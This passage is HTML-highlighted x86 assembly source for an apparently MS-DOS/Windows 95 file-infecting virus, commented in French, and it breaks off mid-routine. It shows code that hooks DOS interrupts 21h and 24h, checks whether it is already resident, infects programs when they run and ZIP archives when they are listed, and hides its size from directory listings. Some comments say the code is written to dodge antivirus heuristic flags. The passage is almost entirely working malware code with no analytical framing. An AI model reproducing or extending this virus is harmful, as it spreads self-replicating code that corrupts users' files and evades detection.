</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">;********** installation de mon interruption 21 ************************</span><span class="sc0">

</span><span class="sc5">installe</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;------ 1) recuperation de l'ancien vecteur d'interruption</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">                   </span><span class="sc1">;int 35XX=recup du vecteur de l'int XX</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                              </span><span class="sc1">;go! on aura bx=offset, es=segment</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                               </span><span class="sc1">;recup zone HMA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ip_21</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">         </span><span class="sc1">;on stocke l'offset</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cs_21</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">         </span><span class="sc1">;on stocke le segment</span><span class="sc0">

</span><span class="sc1">;------ 2) mise en place de MON vecteur d'interruption</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nouvelle_int_21</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;dx=offset nouvelle int</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2522h</span><span class="sc0">           </span><span class="sc1">;int 25XX=chgt de l'int XX</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; !!!evite flag M!!!</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                              </span><span class="sc1">;go</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">deja_installe</span><span class="sc0">       </span><span class="sc1">;sinon merdouille au boot, tres reperable.</span><span class="sc0">

</span><span class="sc1">;******************** mon interruption 21 *****************************</span><span class="sc0">

</span><span class="sc5">nouvelle_int_21</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;c'est ici que se brancheront les appels</span><span class="sc0">

</span><span class="sc1">;------ 1) recuperation et detournement du vecteur d'interruption INT24</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                                </span><span class="sc1">;on stocke l'offset</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ip_24</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;on stocke le segment</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cs_24</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nouvelle_int_24</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">;---- determiner la fonction</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth_non</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">;archiver: no stealth</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">saute_dir_stealth</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">77h</span><span class="sc0">                     </span><span class="sc1">;dir?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pas_dir</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dir_stealth_dos</span><span class="sc0">
</span><span class="sc5">pas_dir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">                     </span><span class="sc1">;dir?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pas_dir2</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dir_stealth_dos</span><span class="sc0">
</span><span class="sc5">pas_dir2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">714Fh</span><span class="sc0">                   </span><span class="sc1">;dir under W95?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pas_dir3</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dir_stealth_win</span><span class="sc0">
</span><span class="sc5">pas_dir3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">714Eh</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pas_dir4</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dir_stealth_win</span><span class="sc0">
</span><span class="sc5">pas_dir4</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">saute_dir_stealth</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6666h</span><span class="sc0">                   </span><span class="sc1">; !!!evite flag L!!!</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2D66h</span><span class="sc0">                   </span><span class="sc1">;execution d'un programme? </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">suite</span><span class="sc0">                       </span><span class="sc1">;si non, on continue</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6666h</span><span class="sc0">                   </span><span class="sc1">;si oui, on remet ax en place</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infecte</span><span class="sc0">                     </span><span class="sc1">;et on infecte le programme</span><span class="sc0">
</span><span class="sc5">suite</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6666h</span><span class="sc0">                   </span><span class="sc1">;on remet ax en place</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6969h</span><span class="sc0">                   </span><span class="sc1">;c'est le test de residence?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">vieille_int_21</span><span class="sc0">              </span><span class="sc1">;non =&gt; on continue avec la vieille int </span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;oui =&gt; on met 696Ah dans bx</span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">                            </span><span class="sc1">;et on retourne au programme (+recup flags)</span><span class="sc0">

</span><span class="sc1">;***************** l'ancienne interruption 21 *************************</span><span class="sc0">

</span><span class="sc5">vieille_int_21</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;on continue comme si de rien n'etait</span><span class="sc0">

</span><span class="sc1">;---------remettre INT24---------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ip_24</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cs_24</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">                         </span><span class="sc1">;EAh=JMP FAR, on va JMPer a la vieille int</span><span class="sc0">
</span><span class="sc5">ip_21</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                      </span><span class="sc1">;offset de la vieille int</span><span class="sc0">
</span><span class="sc5">cs_21</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                      </span><span class="sc1">;segment de la vieille int</span><span class="sc0">

</span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">;???</span><span class="sc0">

</span><span class="sc1">;*************** directory stealth under DOS &amp; W3.1 ****************************</span><span class="sc0">

</span><span class="sc5">dir_stealth_dos</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">                   </span><span class="sc1">;simulation d'une int 21h, donc flags</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">;et segment</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vieille_int_21</span><span class="sc0">     </span><span class="sc1">;on appelle la vieille</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">;si al=0 tout est OK</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_fcb</span><span class="sc0">            </span><span class="sc1">;sinon on arrete</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">;ax, bx et es vont etre modifies</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5100h</span><span class="sc0">               </span><span class="sc1">;chope psp courante</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;retour segment psp dans bx, offset dans dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">;es= segment psp</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;voir si l'appel vient du DOS</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_fcb2</span><span class="sc0">           </span><span class="sc1">;non, on gicle</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;bx= offset de la psp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;voir si c'est une fcb etendue</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">;sauvegarde le marqueur</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2F00h</span><span class="sc0">              </span><span class="sc1">;chope dta courante</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;retourne dans es:bx l'emplacement de la dta</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;recup marqueur fcp etendue</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">;FFh+1=0, donc si etendue z=0</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_fix</span><span class="sc0">              </span><span class="sc1">;pas etendue</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">               </span><span class="sc1">;etendue: 7 octets de plus a l'offset</span><span class="sc0">
</span><span class="sc5">no_fix</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"IZ"</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">continue_stealth</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"P"</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">continue_stealth</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infecte_zip_from_dos</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_fcb2</span><span class="sc0">
</span><span class="sc5">continue_stealth</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;time in al</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011111b</span><span class="sc0">       </span><span class="sc1">;just look at seconds</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001111b</span><span class="sc0">       </span><span class="sc1">;seconds = 30?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_fcb2</span><span class="sc0">           </span><span class="sc1">;no =&gt; stop stealth</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;prog&lt;65000?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">soustraction</span><span class="sc0">                                        </span><span class="sc1">;no =&gt; stealth it</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">      </span><span class="sc1">;prog&lt;virus size+500?</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">exit_fcb2</span><span class="sc0">                                            </span><span class="sc1">;yes =&gt; no stealth</span><span class="sc0">
</span><span class="sc5">soustraction</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000011111100000b</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;substract virus size</span><span class="sc0">
</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exit_fcb2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">exit_fcb</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;****************** directory stealth under W95 *****************************</span><span class="sc0">

</span><span class="sc5">dir_stealth_win</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;pour que le timedate soit en format DOS</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">                   </span><span class="sc1">;c'est moi qui appelle l'INT 21, donc flags</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">;et segment</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vieille_int_21</span><span class="sc0">     </span><span class="sc1">;va chercher info sur le fichier</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">       </span><span class="sc1">;on sauve tout ce qui revient</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">             </span><span class="sc1">;dir finished? (error code=12h, no more file)</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pas_fini</span><span class="sc0">            </span><span class="sc1">;no =&gt; continue</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">         </span><span class="sc1">;yes =&gt; return </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111110b</span><span class="sc0"> </span><span class="sc1">;but before, set carry in flags before the int call</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;flags before int call are somewhere on the stack</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">                </span><span class="sc1">;if i don't do that, after iret carry is back to zero (??)</span><span class="sc0">
